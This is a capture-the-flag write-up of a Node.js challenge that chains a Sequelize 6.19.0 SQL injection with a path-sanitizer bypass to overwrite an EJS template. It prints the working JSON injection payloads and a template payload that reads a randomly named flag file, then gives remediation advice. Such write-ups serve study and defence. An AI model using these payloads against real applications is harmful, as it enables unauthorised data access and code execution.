

## Exploitation
Code analyse : 

```javascript
const { Sequelize, DataTypes, Op, literal } = require_v(""sequelize"", ""6.19.0"");
const psanitize = require_v(""path-sanitizer"", ""2.0.0"");
```

Here we can see the versions of the libraries used in the application. Sequelize 6.19.0 is known to be vulnerable to SQL injection in certain literal + replacements usage patterns (ref: https://github.com/sequelize/sequelize/issues/14519). The path-sanitizer version used is also susceptible to path traversal issues in some configurations.

In main app : 

 ```javascript
await Users.update(
      { attachment: data.attachment },
      {
        where: {
          id: 2,
        },
    );
    // Get user from database
    const user = await Users.findOne({
      where: {
        [Op.and]: [
          sequelize.literal(`strftime('%Y-%m-%d', updatedAt) >= :updatedat`),
          { name: data.username },
          { verify: true }
        ],
      },
      replacements: { updatedat: data.updatedat },
    })

    // Sanitize the attachment file path
    const file = `/tmp/user/files/${psanitize(user.attachment)}`
    // Write the attachment content to the sanitized file path
    fs.writeFileSync(file, data.content)

```
 
The input requires valid JSON, validated by the function `getJsonInput()`. If the input is not valid JSON, the application returns an error message:

<img src="src/image/"YWH-R703411-image.png"">

`await Users.update()` updates the user with `id = 2`, so we only need to craft a SQL payload to manipulate that user’s attachment and content. The `Users.findOne()` call is the vulnerable part (SQL injection) because it uses sequelize.literal(... :updatedat ...) combined with replacements. See details here: https://github.com/sequelize/sequelize/issues/14519

in our example the code below :
```javascript
   sequelize.literal(`strftime('%Y-%m-%d', updatedAt) >= :updatedat`),
          { name: data.username },
          { verify: true }
```
we just need to craft our payload :
```json
{
  ""username"": "":updatedat"",
  ""updatedat"": "" -- "",
  ""attachment"": """",
  ""content"": """"
}
```
we got lucky because the error message display also the Sequelize error message:
```
SequelizeDatabaseError: SQLITE_ERROR: incomplete input
```
the goal is to craft a good sql query that select the user id=2
```SQL
SELECT * FROM Users WHERE strftime('%Y-%m-%d', updatedAt) >= :updatedat AND name = :username AND verify = 1; 
```

After various attempts if found the winning payload : 
```json
{
  ""username"": "":updatedat"",
  ""updatedat"": "" ) OR id=2 --"",
  ""attachment"": """",
  ""content"": """"
}
```
In SQL format : 

``` SELECT * FROM Users WHERE strftime('%Y-%m-%d', updatedAt) >=  ) OR id=2 --  AND name =  ) OR id=2 -- AND verify = 1; ```

Because :updatedat is supplied via replacements into a literal, an attacker can inject SQL to alter the WHERE clause.

We observed application error messages useful for debugging, e.g.:

` Error: EISDIR: illegal operation on a directory, open '/tmp/user/files/.' ` 

<em>the error occurred because data.attachment was empty in that test </em>.


Now that we can select the intended user, we used path traversal / sanitization-bypass techniques on attachment to overwrite /tmp/view/index.ejs (the rendered template). After writing an attacker-controlled template, rendering /tmp/view/index.ejs executed the payload.

<img src="src/image/"YWH-R703534-image.png"">

We successfully overwrote the view and displayed “bonjour”!

## PoC

After we found the correct path for the challenge, the final step was to display the flag in /tmp/. The challenge made this harder by writing the flag to a randomized filename

```javascript
fs.writeFileSync(`flag_${crypto.randomBytes(16).toString('hex')}.txt`, flag);
```
For that, we need to use globbing in Node.js

<img src="src/image/"YWH-R703540-image.png"">

Unfortunately we can't use `require` directly, so we used `process.mainModule`:

```javascript
process.mainModule.require('fs').readFileSync(process.mainModule.require('glob').sync('/tmp/flag*')[0])
```
Submit : 

<img src="src/image/"YWH-R703600-image.png"">

### Flag :  FLAG{Bug_C4ins_Br1ng5_Th3_B3st_Imp4ct}
## Risk

SSTI can lead to reading sensitive files, executing system commands, or exfiltrating data.

## Remediation

Upgrade Sequelize and path-sanitizer to patched versions. Additionally, prevent writing user-provided content into server-side templates and validate/sanitize inputs used in database queries.

## References

https://github.com/sequelize/sequelize/issues/14519
https://bughra.dev/posts/ssti/
https://sequelize.org/docs/v6/
https://security.snyk.io/vuln/SNYK-JS-PATHSANITIZER-8600546",,\,\,,,,,,,,unknown
